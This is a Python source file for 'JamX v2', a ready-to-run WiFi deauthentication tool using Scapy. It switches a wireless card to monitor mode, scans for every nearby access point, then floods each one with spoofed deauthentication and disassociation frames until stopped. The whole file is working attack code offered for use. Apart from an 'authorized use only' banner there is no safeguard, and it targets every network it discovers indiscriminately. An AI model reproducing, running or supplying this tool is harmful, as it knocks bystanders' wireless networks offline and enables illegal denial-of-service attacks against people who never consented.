#!/usr/bin/env python3
"""
JamX v2 — Multi-Target WiFi Deauthentication Tool
Built by bxbySAMRAT | FOR AUTHORIZED USE ONLY
"""

# ── ANSI Colors ───────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

BANNER = f"""{RED}{BOLD}
    ██╗ █████╗ ███╗   ███╗██╗  ██╗
     ██║██╔══██╗████╗ ████║╚██╗██╔╝
     ██║███████║██╔████╔██║ ╚███╔╝
██   ██║██╔══██║██║╚██╔╝██║ ██╔██╗
╚█████╔╝██║  ██║██║ ╚═╝ ██║██╔╝ ██╗
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝{RESET}

{YELLOW}  ⚡ Multi-Target WiFi Deauth Tool ⚡
  Built by — bxbySAMRAT
  [ Auto Monitor Mode | Scapy-Powered ]
     {RED}FOR AUTHORIZED USE ONLY 🔴{RESET}
"""

import argparse
import os
import random
import re
import signal
import sys
import threading
import time
import subprocess

from scapy.all import (
    RadioTap, Dot11, Dot11Beacon, Dot11Deauth, Dot11Disas,
    Dot11Elt, RandMAC, sendp, sniff,
)


# ── Constants ─────────────────────────────────
CHANNELS_2G = list(range(1, 14))
CHANNELS_5G = [
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
    149, 153, 157, 161, 165,
]
DEAUTH_REASONS = [1, 2, 3, 4, 7, 8]

# ── Shared State ──────────────────────────────
ap_store     = {}
ap_lock      = threading.Lock()
scan_stop    = threading.Event()   # kills channel hopper after scan
run_stop     = threading.Event()   # kills everything on Ctrl+C
total_frames = 0
frames_lock  = threading.Lock()


# ── Monitor Mode Manager ─────────────────────
def enable_monitor_mode(iface: str) -> str:
    """Kill interfering processes and enable monitor mode."""
    print(f"{CYAN}[*]{RESET} Killing interfering processes (NetworkManager, wpa_supplicant)...")
    subprocess.run(["airmon-ng", "check", "kill"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    print(f"{CYAN}[*]{RESET} Enabling monitor mode on {BOLD}{iface}{RESET}...")
    subprocess.run(["airmon-ng", "start", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    # ── Reliable detection using 'iw dev' ─────
    iw_result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    mon_iface = None
    current_iface = None

    for line in iw_result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            current_iface = line.split()[1]
        if "type monitor" in line and current_iface:
            mon_iface = current_iface
            break

    # ── Fallback 1: check <iface>mon directly ──
    if not mon_iface:
        candidate = iface + "mon"
        check = subprocess.run(["iwconfig", candidate],
                               capture_output=True, text=True)
        if "Monitor" in check.stdout:
            mon_iface = candidate

    # ── Fallback 2: iw manual monitor mode ─────
    if not mon_iface:
        print(f"{YELLOW}[!]{RESET} airmon-ng fallback failed, trying iw manually...")
        subprocess.run(["ip", "link", "set", iface, "down"],
                       stdout=subprocess.DEVNULL)
        subprocess.run(["iw", iface, "set", "monitor", "none"],
                       stdout=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"],
                       stdout=subprocess.DEVNULL)
        mon_iface = iface

    print(f"{GREEN}[+]{RESET} Monitor mode enabled → interface: {BOLD}{mon_iface}{RESET}\n")
    return mon_iface


def disable_monitor_mode(mon_iface: str, original_iface: str) -> None:
    """Restore NIC to managed mode after attack."""
    print(f"\n{CYAN}[*]{RESET} Restoring {BOLD}{original_iface}{RESET} to managed mode...")
    subprocess.run(["airmon-ng", "stop", mon_iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["service", "NetworkManager", "start"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{GREEN}[+]{RESET} {original_iface} restored to managed mode.")


# ── Channel Hopper ────────────────────────────
def channel_hopper(iface: str, channels: list) -> None:
    """Hop through channels until scan_stop is set."""
    idx = 0
    while not scan_stop.is_set():
        ch = channels[idx % len(channels)]
        # BUG FIX #4: subprocess instead of os.system to prevent shell injection
        subprocess.run(
            ["iwconfig", iface, "channel", str(ch)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        idx += 1
        time.sleep(0.25)


# ── Beacon Sniffer ────────────────────────────
def beacon_handler(pkt) -> None:
    """Extract AP info from beacon frames."""
    if not (pkt.haslayer(Dot11Beacon) and pkt.haslayer(Dot11Elt)):
        return
    bssid = pkt[Dot11].addr2
    if not bssid:
        return

    ssid = pkt[Dot11Elt].info.decode(errors="ignore").strip()

    # BUG FIX #3: robust Python 3 byte parsing instead of ord()
    try:
        ch_bytes = pkt[Dot11Elt:3].info
        ch = int.from_bytes(ch_bytes, byteorder="little") if ch_bytes else 0
    except Exception:
        ch = 0

    with ap_lock:
        if bssid not in ap_store:
            display_ssid = ssid if ssid else "<hidden>"
            print(f"  {GREEN}[+]{RESET} Found: {display_ssid:<30} BSSID: {bssid}  CH:{ch}")
            ap_store[bssid] = (ssid, ch)


def scan_networks(iface: str, duration: int = 15) -> None:
    """Sniff for beacon frames for the given duration."""
    print(f"{CYAN}[*]{RESET} Scanning on {BOLD}{iface}{RESET} for {duration}s...")
    sniff(
        iface=iface,
        prn=beacon_handler,
        timeout=duration,
        store=False,
        lfilter=lambda p: p.haslayer(Dot11Beacon),
    )
    print(f"\n{CYAN}[*]{RESET} Scan complete. {BOLD}{len(ap_store)}{RESET} network(s) found.\n")


# ── Attack Frame Builder ─────────────────────
def build_attack_frames(bssid: str, reason: int) -> list:
    """
    Build 4 attack frames per burst (bidirectional deauth + disassoc).
    Uses a fresh random MAC for the spoofed client each burst.
    """
    broadcast = "ff:ff:ff:ff:ff:ff"
    fake_client = str(RandMAC())

    frames = [
        # 1) AP → Broadcast  Deauth
        RadioTap() / Dot11(type=0, subtype=12,
                           addr1=broadcast, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=reason),
        # 2) AP → Broadcast  Disassoc
        RadioTap() / Dot11(type=0, subtype=10,
                           addr1=broadcast, addr2=bssid, addr3=bssid) / Dot11Disas(reason=reason),
        # 3) Spoofed Client → AP  Deauth
        RadioTap() / Dot11(type=0, subtype=12,
                           addr1=bssid, addr2=fake_client, addr3=bssid) / Dot11Deauth(reason=reason),
        # 4) Spoofed Client → AP  Disassoc
        RadioTap() / Dot11(type=0, subtype=10,
                           addr1=bssid, addr2=fake_client, addr3=bssid) / Dot11Disas(reason=reason),
    ]
    return frames


# ── Per-AP Deauth Worker ─────────────────────
def deauth_worker(iface: str, bssid: str, ssid: str, channel: int, interval: float) -> None:
    """
    Continuously send deauth+disassoc bursts to a single AP
    until run_stop is set (Ctrl+C).
    """
    global total_frames

    # Lock to target channel
    subprocess.run(
        ["iwconfig", iface, "channel", str(channel)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    display_ssid = ssid if ssid else "<hidden>"
    print(f"  {RED}[>]{RESET} Deauthing '{BOLD}{display_ssid}{RESET}' ({bssid}) CH{channel}")

    while not run_stop.is_set():
        reason = random.choice(DEAUTH_REASONS)
        frames = build_attack_frames(bssid, reason)
        for frame in frames:
            if run_stop.is_set():
                break
            sendp(frame, iface=iface, count=1, inter=0, verbose=False)
        # Atomically update frame counter
        with frames_lock:
            total_frames += 4
        time.sleep(interval)


# ── Live Stats Printer ────────────────────────
def stats_printer() -> None:
    """Print live stats every 5 seconds until run_stop."""
    while not run_stop.is_set():
        run_stop.wait(5)
        if run_stop.is_set():
            break
        with frames_lock:
            count = total_frames
        print(f"\r{CYAN}[~] Live: {len(ap_store)} APs targeted | {count} total frames sent{RESET}",
              end="", flush=True)


# ── Main Attack Orchestrator ─────────────────
def multi_deauth(iface: str, interval: float, threads_limit: int) -> None:
    """Spawn continuous deauth workers for every discovered AP."""
    if not ap_store:
        print(f"{YELLOW}[!]{RESET} No APs found. Exiting.")
        return

    print(f"{CYAN}[*]{RESET} Launching {RED}{BOLD}continuous{RESET} deauth on "
          f"{BOLD}{len(ap_store)}{RESET} network(s)...\n")
    print(f"{DIM}    Press Ctrl+C to stop and restore NIC{RESET}\n")

    semaphore = threading.Semaphore(threads_limit)

    def throttled_worker(*args):
        with semaphore:
            deauth_worker(*args)

    # Start live stats printer
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()

    workers = []
    for bssid, (ssid, ch) in ap_store.items():
        t = threading.Thread(
            target=throttled_worker,
            args=(iface, bssid, ssid, ch, interval),
            daemon=True,
        )
        workers.append(t)
        t.start()

    # Block until Ctrl+C
    try:
        while not run_stop.is_set():
            run_stop.wait(1)
    except KeyboardInterrupt:
        pass

    # Ensure all workers notice the stop
    run_stop.set()
    for t in workers:
        t.join(timeout=3)

    print(f"\n\n{CYAN}[*]{RESET} Attack stopped. "
          f"{BOLD}{total_frames}{RESET} total frames sent across "
          f"{BOLD}{len(ap_store)}{RESET} AP(s).")


# ── Entry Point ───────────────────────────────
def main():
    # BUG FIX #1: Print the actual banner with ANSI colors
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="JamX — Multi-target WiFi Deauth | Auto Monitor Mode | Authorized use only"
    )
    parser.add_argument("-i", "--iface", required=True,
                        help="Raw wireless interface (e.g., wlan0, wlan1)")
    parser.add_argument("-s", "--scan", type=int, default=15,
                        help="Scan duration in seconds (default: 15)")
    parser.add_argument("-t", "--interval", type=float, default=0.05,
                        help="Interval between bursts in sec (default: 0.05)")
    parser.add_argument("-T", "--threads", type=int, default=10,
                        help="Max concurrent threads (default: 10)")
    parser.add_argument("--5ghz", action="store_true", dest="five_ghz",
                        help="Include 5GHz channels in scan (requires dual-band NIC)")
    args = parser.parse_args()

    # BUG FIX #5: Correct filename in error message
    if os.geteuid() != 0:
        sys.exit(f"{RED}[!]{RESET} Run as root: sudo python3 jamx.py -i wlan0")

    # Build channel list
    channels = CHANNELS_2G + CHANNELS_5G if args.five_ghz else CHANNELS_2G
    band_label = "2.4GHz + 5GHz" if args.five_ghz else "2.4GHz"
    print(f"{CYAN}[*]{RESET} Channel band: {BOLD}{band_label}{RESET} ({len(channels)} channels)\n")

    # ── AUTO MONITOR MODE ──
    mon_iface = enable_monitor_mode(args.iface)

    def graceful_shutdown(signum, frame):
        """Handle Ctrl+C: stop everything."""
        print(f"\n{YELLOW}[!]{RESET} Caught interrupt — shutting down...")
        scan_stop.set()
        run_stop.set()

    signal.signal(signal.SIGINT, graceful_shutdown)

    try:
        # ── SCAN PHASE ──
        hop = threading.Thread(
            target=channel_hopper, args=(mon_iface, channels), daemon=True
        )
        hop.start()

        scan_networks(mon_iface, duration=args.scan)

        # BUG FIX #2: Only kill the hopper, not the deauth workers
        scan_stop.set()

        # ── ATTACK PHASE ──
        multi_deauth(mon_iface, args.interval, args.threads)

    finally:
        # ── AUTO RESTORE MANAGED MODE ──
        run_stop.set()
        disable_monitor_mode(mon_iface, args.iface)


if __name__ == "__main__":
    main()
